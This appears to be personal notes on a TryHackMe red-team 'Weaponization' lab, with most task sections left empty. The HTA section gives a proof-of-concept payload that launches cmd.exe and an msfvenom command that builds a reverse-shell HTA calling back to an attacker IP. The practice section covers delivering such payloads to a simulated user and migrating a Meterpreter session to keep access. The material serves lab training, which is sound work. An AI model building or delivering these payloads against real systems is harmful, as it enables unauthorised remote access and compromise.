![image](https://user-images.githubusercontent.com/51442719/180655800-ab7238f2-e777-4ea2-8203-8c2a0ca86566.png)

# [Weaponization](https://tryhackme.com/room/weaponization)
> #### Understand and explore common red teaming weaponization techniques. 
> #### You will learn to build custom payloads using common methods seen in the industry to get initial access.

---

- [ ] [Task 1  Introduction]()
- [ ] [Task 2  Deploy the Windows Machine]()
- [ ] [Task 3  Windows Scripting Host - WSH]()
- [ ] [Task 4  An HTML Application - HTA]()
- [ ] [Task 5  Visual Basic for Application - VBA]()
- [ ] [Task 6  PowerShell - PSH]()
- [ ] [Task 7  Command And Control - (C2 Or C&C)]()
- [ ] [Task 8  Delivery Techniques]()
- [ ] [Task 9  Practice Arena](#task-9--practice-arena)

---

# [Task 1  Introduction]()

---

# [Task 2  Deploy the Windows Machine]()

---

# [Task 3  Windows Scripting Host - WSH]()

---

# [Task 4  An HTML Application - HTA]()

### An HTML Application (HTA)
- HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered.
- HTML Applications, also known as HTAs, which are dynamic `HTML` pages containing JScript and VBScript. 
- The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files. 
- It can be executed by itself or automatically from Internet Explorer. 

#### In the following example, we will use an [`ActiveXObject`](https://en.wikipedia.org/wiki/ActiveX) in our payload as proof of concept to execute `cmd.exe`. 
- Consider the following HTML code.
```hta
<html>
<body>
<script>
	var c= 'cmd.exe'
	new ActiveXObject('WScript.Shell').Run(c);
</script>
</body>
</html>
```
- Then serve the `payload.hta` from a web server, this could be done from the attacking machine as follows,
```cmd
python3 -m http.server 8090
```
- On the victim machine, visit the malicious link using Microsoft Edge, `http://10.8.232.37:8090/payload.hta`. Note that the `10.8.232.37` is the AttackBox's IP address.
  > ![image](https://user-images.githubusercontent.com/51442719/180656414-2cc1cad9-0fc5-4cc0-9cc1-087a192999ae.png)
- Once we press `Run`, the `payload.hta` gets executed, and then it will invoke the `cmd.exe`. 
- The following figure shows that we have successfully executed the `cmd.exe`.
  > ![image](https://user-images.githubusercontent.com/51442719/180656440-dda92953-4d5e-4541-8dec-74e52b781866.png)

#### HTA Reverse Connection
- We can create a reverse shell payload as follows,
```cmd
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
```





---

# [Task 5  Visual Basic for Application - VBA]()

---

# [Task 6  PowerShell - PSH]()

---

# [Task 7  Command And Control - (C2 Or C&C)]()

---

# [Task 8  Delivery Techniques]()

---

# [Task 9  Practice Arena]()

- We have prepared a Windows 10 machine that runs a user simulation web app to execute your payloads or visit the malicious HTA links automatically. 
- Deploy the attached machine and wait a couple of minutes until it's up and running. 
- Then, visit the user simulator web application at `http://10.10.132.115:8080/`.
- Make sure to visit the user simulator web application from the AttackBox, or you can access it by connecting to the VPN.
  > ![image](https://user-images.githubusercontent.com/51442719/180656171-3cd54534-77fc-458a-9d7b-f431ca69280d.png)
- The web application allows uploading payloads as VBS, DOC, PS1 files. In addition, if you provide a malicious HTA link, the web application will visit your link.
- **Note for Doc files**: the simulation used in the provided Windows 10 machine will open the malicious Word document and be closed within 90 seconds. 
- In order to get longer prescience, you need to migrate as soon as you receive the connection back. 
- In the Metasploit framework, we can inject our current process into another process on the victim machine using migrate. 
- In our case, we need to `migrate` our current process, which is the MS word document, into another process to make the connection stable even if the MS word document is closed. 
- The easiest way to do this is by using `migrate` post-module as follow,
```cmd
meterpreter > run post/windows/manage/migrate 
```
- In this task, the goal is to generate a reverse shell payload of your choice and send it through the web application. 
- Once the web application runs your payload, you should receive a connect back. 
- Answer the question below and prove your access by finding the flag once you receive a reverse shell.
- For reference, you can use the MSFVenom Cheat Sheet on this [`website`](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/).

### Answer the questions below
- What is the flag? Hint: Check the user desktop folder for the flag!
  > Answer format: [`***{********************************}`]()







